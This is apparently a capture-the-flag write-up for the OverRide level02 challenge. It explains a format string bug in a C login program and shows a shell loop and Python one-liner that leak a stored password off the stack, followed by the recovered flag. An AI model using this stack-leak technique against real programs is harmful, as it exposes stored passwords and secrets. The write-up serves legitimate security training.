
# Walkthrough

**Main** : 
challenge involves exploiting a vulnerable C program to print the contents of a flag stored on the stack. Here's a step-by-step explanation of the program:
1.  The program starts by opening and reading the contents of the "/home/users/level03/.pass" file into a buffer called `pass_buffer`.
    
2.  It then displays a username prompt using `fgets()` and stores the input in the `username_buffer`.
    
3.  Similarly, it displays a password prompt using `fgets()` and stores the input in the `pwd_buffer`.
    
4.  After that, it compares the contents of `pass_buffer` with `pwd_buffer` using `strncmp()`. If they don't match, it prints an error message and exits. Otherwise, it prints a welcome message and executes `/bin/sh`.

-   Initially, the goal is to find the distance between the `username_buffer`and the stored password `pass_buffer`  on the stack.
- The lengths of `username_buffer` and `pass_buffer` are different, and it's necessary to locate the correct start point.

**Process to exploit :**
>   1. Leak the contents of the stack. 
>   2. Print  consecutive 8-byte chunks of memory


## Step 1

###  Leak the contents of the stack

-   To leak the contents of the stack, we use the format string vulnerability during the username prompt.
-   We provide a format string that includes `%p` format specifiers with parameter specifiers `x$`.
	
	```
	level02@OverRide:~$ for ((i = 21; i < 30; i++)); do echo "$i - %$i\$p" | ./level02; done | grep does
	21 - (nil) does not have access!
	22 - 0x756e505234376848 does not have access!
	23 - 0x45414a3561733951 does not have access!
	24 - 0x377a7143574e6758 does not have access!
	25 - 0x354a35686e475873 does not have access!
	26 - 0x48336750664b394d does not have access!
	level02@OverRide:~$ 

	```
	In summary, this line of code is part of a script that is attempting to exploit the `level02` program using format string vulnerabilities. It iterates through values of `i` from 21 to 30, each time sending a format string to `level02` that tries to print the value at the `i`-th position on the stack. 
The script then checks if the output of `level02` contains the word "does," likely as an indicator that a successful format string attack has occurred.


## Step 2

### Print  consecutive 8-byte chunks of memory 
```
python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
The output of this command is the concatenated and reversed ASCII representation of the given hexadecimal strings, which appears to be a string: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

Flag:
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
